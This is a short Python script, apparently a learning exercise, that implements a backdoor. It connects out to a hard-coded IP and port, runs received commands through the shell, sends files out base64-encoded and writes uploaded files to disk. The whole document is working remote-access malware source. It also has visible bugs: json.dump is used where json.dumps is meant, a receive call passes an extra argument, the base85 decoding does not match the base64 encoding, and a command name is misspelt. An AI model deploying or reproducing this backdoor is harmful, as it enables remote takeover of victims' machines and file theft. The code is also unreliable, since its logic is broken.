#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port)) # victim pc ip

    def reliable_send(self, data):
        json_data = json.dump(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = self.connection.recv(1024)
        return json.loads(json_data)

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path
    
    def read_file(self, path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())
    
    def write_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b85decode(content))
            return "[+] Upload successfull."

    def run(self):
        while True:
            command = self.reliable_receive(1024)
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "doanload":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution."
            self.reliable_send(command_result)


my_backdoor = Backdoor("192.168.1.11", 4444)
my_backdoor.run()